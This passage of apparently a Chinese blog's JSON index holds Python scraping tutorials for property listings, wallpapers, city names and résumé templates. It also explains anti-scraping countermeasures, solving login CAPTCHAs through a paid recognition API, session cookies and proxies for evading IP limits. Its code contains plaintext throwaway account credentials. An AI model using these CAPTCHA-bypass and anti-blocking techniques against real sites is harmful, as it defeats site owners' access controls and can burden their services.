AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53&#x27;    &#125;    url = &#x27;https://bj.58.com/ershoufang/&#x27;    page_text = requests.get(url=url, headers=headers).text    # xpath解析,并定位需求标签（所取内容父标签）    tree = etree.HTML(page_text)    div_list = tree.xpath(&#x27;//section[@class=&quot;list&quot;]/div&#x27;)    # print(div_list)    # 存储    fp = open(&#x27;./58.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    # 取a标签-div-h3标签的内容    for div in div_list:        # 局部定位        title = div.xpath(&#x27;./a/div[2]//h3/text()&#x27;)[0]        # fp.write(title,&#x27;\\n&#x27;)相当于用了两次write()，推荐用+连接        fp.write(title + &#x27;\\n&#x27;)        # fp.close()        # print(title)\n彼岸图网图片#!/usr/bin/env python3# -*-coding:utf-8-*-# 爬取彼岸图网4k图片：https://pic.netbian.comimport requestsfrom lxml import etreeimport osif __name__ == &quot;__main__&quot;:    if os.path.exists(&#x27;./biantuwang&#x27;) is False:        os.mkdir(&#x27;./biantuwang&#x27;)    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53&#x27;    &#125;    # 其他页面图片URL，可做循环来调用：https://pic.netbian.com/4kdongman/index_2.html    url = &#x27;https://pic.netbian.com/4kdongman/&#x27;    # page_text = requests.get(url=url, headers=headers).text.encode(&quot;ISO-8859-1&quot;)    response = requests.get(url=url, headers=headers)    # 手动设置响应数据的编码方式    # response.encoding = &#x27;utf-8&#x27;    page_text = response.text    tree = etree.HTML(page_text)    # 建议相对路径的第一个标签属性名为唯一值    li_list = tree.xpath(&#x27;//div[@class=&quot;slist&quot;]/ul/li&#x27;)    # print(li_list)    for li in li_list:        img_src = &#x27;https://pic.netbian.com&#x27; + li.xpath(&#x27;./a/img/@src&#x27;)[0]        # img_src = li.xpath(&#x27;./a/img/@src&#x27;)        img_name = li.xpath(&#x27;./a/img/@alt&#x27;)[0] + &#x27;.jpg&#x27;        # 通用解决中文乱码，需重新赋值        img_name = img_name.encode(&#x27;ISO-8859-1&#x27;).decode(&#x27;gbk&#x27;)        # print(img_name, img_src)        img_data = requests.get(url=img_src, headers=headers).content        # 文件夹bianantuwang需提前建立        img_path = &#x27;./biantuwang/&#x27; + img_name        # print(img_path)        with open(img_path, &#x27;wb&#x27;) as fp:            fp.write(img_data)            fp.close()            print(img_name + &#x27;下载成功！！！&#x27;)\n空气检测平台城市#!/usr/bin/env python3# -*-coding:utf-8-*-# 爬取中国空气质量在线监测分析平台各城市名称import requestsfrom lxml import etreeif __name__ == &quot;__main__&quot;:    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53&#x27;    &#125;    url = &#x27;https://www.aqistudy.cn/historydata/&#x27;    page_text = requests.get(url=url, headers=headers).text    # print(page_text)    tree = etree.HTML(page_text)    # print(tree)    # 懒得分两步了，直接热门和所有一起拉取    li_list = tree.xpath(&#x27;//div[@class=&quot;bottom&quot;]/ul//li&#x27;)    # print(li_list)    all_city_names = []    fp = open(&#x27;./citys.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    for li in li_list:        city_name = li.xpath(&#x27;./a/text()&#x27;)[0]        fp.write(city_name + &#x27;\\n&#x27;)        all_city_names.append(city_name)        print(city_name)    fp.close()\n站长之家免费简历#!/usr/bin/env python3# -*-coding:utf-8-*-# 爬取站长之家免费简历模板import requestsimport osfrom lxml import etreeif __name__ == &quot;__main__&quot;:    if os.path.exists(&#x27;./jianli&#x27;) is False:        os.mkdir(&#x27;./jianli&#x27;)    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.53&#x27;    &#125;    # 其他 https://sc.chinaz.com/jianli/free_2.html    url = &#x27;https://sc.chinaz.com/jianli/free_&#123;num&#125;.html&#x27;    # 多页拉取    for x in range(29, 30):        # new_url = format(url % x)        # new_url = &#x27;https://sc.chinaz.com/jianli/free_&#123;num&#125;.html&#x27;.format(num=x)        url = url.format(num=x)        # print(new_url)        # 单页拉取        # url = &#x27;https://sc.chinaz.com/jianli/free.html&#x27;        page_text = requests.get(url=url, headers=headers).text        tree = etree.HTML(page_text)        # print(tree)        div_list = tree.xpath(&#x27;//div[@id=&quot;main&quot;]/div/div&#x27;)        # print(div_list)        for div in div_list:            a_href = &#x27;https:&#x27; + div.xpath(&#x27;./a/@href&#x27;)[0]            # print(a_href)            a_href_text = requests.get(url=a_href, headers=headers).text.encode(&#x27;ISO-8859-1&#x27;)            a_tree = etree.HTML(a_href_text)            a_src = a_tree.xpath(&#x27;//div[@class=&quot;down_wrap&quot;]/div[2]/ul/li[3]/a/@href&#x27;)[0]            # 此处增加去除开头和结尾的空格            a_name = a_tree.xpath(&#x27;//div[@class=&quot;bgwhite&quot;]/div/h1/text()&#x27;)[0].strip() + &#x27;.rar&#x27;            # 该方式于此处似乎无效            # 试下.content.decode(&#x27;utf-8&#x27;)            # a_name = a_name.encode(&#x27;ISO-8859-1&#x27;).decode(&#x27;gbk&#x27;)            # print(a_name)            # print(a_src)            # 获取二进制数据，写入a_name文件            rar_page = requests.get(url=a_src, headers=headers).content            with open(&#x27;./jianli/&#x27; + a_name, &#x27;wb&#x27;) as fp:                fp.write(rar_page)                fp.close()                print(a_name + &#x27;--&gt;下载完毕！！！&#x27;)        print(&quot;\\n当前拉取到第&#123;&#125;页&quot;.format(x))    print(&#x27;\\n全部简历拉取结束！！！&#x27;)\n","categories":["Python"],"tags":["爬虫"]},{"title":"爬虫之概念相关","url":"/article/c2461216.html","content":"声明\n本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。\t–涂寐\n\n爬虫过程\n编程–&gt;模拟上网–&gt;抓取数据\n\n爬虫性质\n法律不禁止，使用有风险\n\n爬虫风险\n干扰网站正常运营\n非法抓取网站数据\n\n防进橘子\n优化程序，避免干扰网站运营\n审查爬取内容，避免敏感内容爬取\n\n使用场景\n通用爬虫:\n抓取系统重要组成–&gt;整个页面数据\n\n\n聚焦爬虫:\n通用爬虫基础上–&gt;抓取特定数据\n\n\n增量式爬虫:  抓取网站最近更新数据\n\n爬虫利弊\n网站希望获得更大知名度\n网站害怕敏感数据被爬取\n\n反爬机制\n门户网站通过制定某些策略和技术来防止爬虫爬取网站数据\n\n反反爬策略\n爬虫程序通过制定某些策略和技术来绕过门户网站的反爬机制，进而爬取其中数据\n\nrobots.txt协议\n规定该门户网站可爬取的数据范围\n\nhttp协议\n服务器与客户端进行数据交互的一种形式\n\n常用请求头\nUser-Agent：UA，请求方的身份标识\nConnection：请求完成后的连接状态\n\n常用响应头\nContent-Type：服务器对客户端响应数据的类型\n\nhttps协议\nhttp+SSL，安全的超文本传输协议\n\n加密方式\n对称密钥加密\n非对称密钥加密\n证书密钥加密\n\n","categories":["Python"],"tags":["爬虫"]},{"title":"爬虫之验证码相关","url":"/article/74cf08f5.html","content":"声明\n本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。 –涂寐\n\n识别方式\n人工识别\n智能识别\nhttp://fast.95man.com/\n\n\n\n云打码使用\n根据官方开发文档调用\n\n登录古诗文网简要概括\n登陆界面获取验证码图片\n调用验证码识别平台接口识别\n勾选 Network –&gt; Preserve log –&gt; 捕获登录请求\n分析后模拟登录，为保证会话的持续连接，使用requests.session().post()&#x2F;get() 发起请求\n\n实战笔记import osimport requestsfrom lxml import etreeclass KSClient(object):    def __init__(self):        self.username = &#x27;&#x27;        self.Token = &#x27;&#x27;        self.headers = &#123;            &#x27;Connection&#x27;: &#x27;Keep-Alive&#x27;,            &#x27;User-Agent&#x27;: &#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)&#x27;,        &#125;    # 获取taken    def GetTaken(self, username, passord):        brtn = False        r = requests.get(            &#x27;http://api.95man.com:8888/api/Http/UserTaken?user=&#x27; + username + &#x27;&amp;pwd=&#x27; + passord + &#x27;&amp;isref=0&#x27;,            headers=self.headers)        arrstr = r.text.split(&#x27;|&#x27;)        if (arrstr[0] == &#x27;1&#x27;):            self.username = username            self.Token = arrstr[1]            brtn = True        return brtn    # 识别图片    def PostPic(self, filepath, codetype):        &quot;&quot;&quot;        imbyte: 图片字节        imgtype: 类型 1为通用类型 更多精准类型请参考 http://fast.net885.com/auth/main.html        &quot;&quot;&quot;        strRtn = &#x27;&#x27;        imbyte = open(filepath, &#x27;rb&#x27;).read()        filename = os.path.basename(filepath)        files = &#123;&#x27;imgfile&#x27;: (filename, imbyte)&#125;        r = requests.post(            &#x27;http://api.95man.com:8888/api/Http/Recog?Taken=&#x27; + self.Token + &#x27;&amp;imgtype=&#x27; + str(codetype) + &#x27;&amp;len=0&#x27;,            files=files, headers=self.headers)        arrstr = r.text.split(&#x27;|&#x27;)        # 返回格式：识别ID|识别结果|用户余额        if (int(arrstr[0]) &gt; 0):            strRtn = arrstr[1]        return strRtn    # 识别报错    def ReportError(self, imageid):        &quot;&quot;&quot;        imageid:报错题目的图片ID        &quot;&quot;&quot;        r = requests.get(&#x27;http://api.95man.com:8888/api/Http/ReportErr?Taken=&#x27; + self.Token + &#x27;&amp;ImgID=&#x27; + str(imageid),                         headers=self.headers)        arrstr = r.text.split(&#x27;|&#x27;)        if (arrstr[0] == &#x27;1&#x27;):            print(&#x27;报错成功！&#x27;)        else:            print(&#x27;报错失败，错误信息：&#x27; + arrstr[1])if __name__ == &#x27;__main__&#x27;:    session = requests.Session()    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;    &#125;    # 捕获登陆界面    url = &#x27;https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx&#x27;    page_text = session.get(url=url, headers=headers).text    tree = etree.HTML(page_text)    code_img_src = &#x27;https://so.gushiwen.cn&#x27; + tree.xpath(&#x27;//*[@id=&quot;imgCode&quot;]/@src&#x27;)[0]    # 捕获到验证码图片    img_data = session.get(url=code_img_src, headers=headers).content    with open(&#x27;./a.jpg&#x27;, &#x27;wb&#x27;) as fp:        fp.write(img_data)    # 调用验证码识别平台接口识别    Ks95man = KSClient()    if Ks95man.GetTaken(&#x27;ceroxg28594@chacuo.net&#x27;, &#x27;ceroxg28594@chacuo.net&#x27;):        # 获取成功,taken获取一次就可以了，taken 生成后如果不用参数&quot;isref=1&quot;刷新，就一直不会变。如果写死在您的软件中，就要慎用&quot;isref=1&quot;，否则您之前写死的软件都要改taken。        # 开始识别        # 获取文件二进制流        result = Ks95man.PostPic(&#x27;a.jpg&#x27;, 1)        print(&#x27;识别结果：&#x27; + result)        # 识别报错        Ks95man.ReportError(88)    # 模拟登录    login_url = &#x27;https://so.gushiwen.cn/user/login.aspx?from=http://so.gushiwen.cn/user/collect.aspx&#x27;    data = &#123;        &#x27;__VIEWSTATE&#x27;: &#x27;3uK9eaUXyiZDe048G8d9KUZLVRTkC9BJiFsJawOYOuXppFLYhil5viqWYspVcZuittimiM+97bFsX9GRxBR13VessGfbfhhJxMyn08gr4PBxTeIeFg5d9tI5n10=&#x27;,        &#x27;__VIEWSTATEGENERATOR&#x27;: &#x27;C93BE1AE&#x27;,        &#x27;from&#x27;: &#x27;http://so.gushiwen.cn/user/collect.aspx&#x27;,        &#x27;email&#x27;: &#x27;npytig62015@chacuo.net&#x27;,        &#x27;pwd&#x27;: &#x27;npytig62015@chacuo.n&#x27;,        &#x27;code&#x27;: result,        &#x27;denglu&#x27;: &#x27;登录&#x27;    &#125;    # login_page_text = requests.post(url=login_url, headers=headers, data=data).text    # with open(&#x27;guishiwen.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:    #     fp.write(login_page_text)    # 返回响应码    # response = requests.post(url=login_url, headers=headers, data=data)    # print(response.status_code)    # 可以肯定，登录是成功的，无法获取登录后界面数据原因：再次跳转且进行新认证，如cookie    # 查阅资料可以知道，确是使用 requests.post() 完成登陆后，立即关闭会话，销毁cookie    # requests.Session().post 调用后保存会话，cookie仍旧存在    login_session_text = session.post(url=login_url,headers=headers,data=data).text;    with open(&#x27;gushiwenwang.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:        fp.write(login_session_text);    print(&quot;执行结束！！！&quot;)\nCookie相关要点与答疑\nhttp&#x2F;https 无状态协议\n发起登录请求提示验证码不正确：发起的登录请求并未基于获取验证码状态发起。\ncookie反反爬机制\n手动封装：headers &#x3D; {‘cookie’: ‘***’}\n自动获取（session会话）\npost 请求模拟登录后获得服务器返回的 cookie\nsession会话对象：使用 session 发起请求时产生的 cookie 自动存入 session 对象中\n\n\n\n\n\nsession会话流程\n创建对象：session &#x3D; requests.session()\n通过 session.post() 或 session.get() 的方式发起请求\n\n实例\n看古诗文网实战笔记\n\n代理服务器代理作用\n反反爬策略–突破IP限制\n隐藏真是IP\n\n相关网站\n度娘给你答案\n\n代理类型\nhttp：http协议URL\nhttps：https协议URL\n\n代理匿名度\n透明：服务器知道使用代理和真实IP\n匿名：服务器知道使用代理，不知真实IP\n高匿名：服务器不知道使用代理和真实IP\n\n代理实例1\n实话实说，IP还是没变import requestsproxy = &#123;    &#x27;https&#x27;: &#x27;https://222.128.171.133:3128&#x27;&#125;response = requests.get(&quot;http://httpbin.org/ip&quot;, proxies=proxy)print(response.text)\n\n代理实例2\n这个更惨，同样的代理访问百度一直报错\n别骂了别骂了，找过度娘了，可能度娘留了一手\n不纠结，留下笔记，以后用到再改改\n实锤了，要充钱，白嫖的基本没了#!/usr/bin/env python3# -*-coding:utf-8-*-import timeimport requestsif __name__ == &quot;__main__&quot;:    # session = requests.Session()    # session.trust_env = False    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;    &#125;    url = &quot;https://www.baidu.com/s?ie=UTF-8&amp;wd=ip&quot;    # 报错    # requests.exceptions.SSLError: HTTPSConnectionPool(host=&#x27;www.baidu.com&#x27;, port=443): Max retries exceeded with url: /s?ie=UTF-8&amp;wd=ip (Caused by SSLError(SSLError(1, &#x27;[SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1076)&#x27;)))    # 再次报错    # requests.exceptions.ProxyError: HTTPSConnectionPool(host=&#x27;www.baidu.com&#x27;, port=443): Max retries exceeded with url: /s?ie=UTF-8&amp;wd=ip (Caused by ProxyError(&#x27;Cannot connect to proxy.&#x27;, NewConnectionError(&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002426CB7C408&gt;: Failed to establish a new connection: [WinError 10061] 由于目标计算机积极拒绝，无法连接。&#x27;)))    # i = 0    # while True:    #     try:    #    response = requests.get(url=url, headers=headers, proxies=&#123;&#x27;https&#x27;: &#x27;https://222.128.171.133:3128&#x27;&#125;, verify=False)        # except:        #     i = i+1        #     print(&quot;有问题&quot;, i)        #     time.sleep(5)        #     continue    # print(&quot;admin&quot; + response.status_code)    # with open(&#x27;./proxy.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:    #     fp.write(proxy_page_text)    # print(&#x27;瞅瞅这个./proxy.html文件&#x27;)\n\n","categories":["Python"],"tags":["爬虫"]}]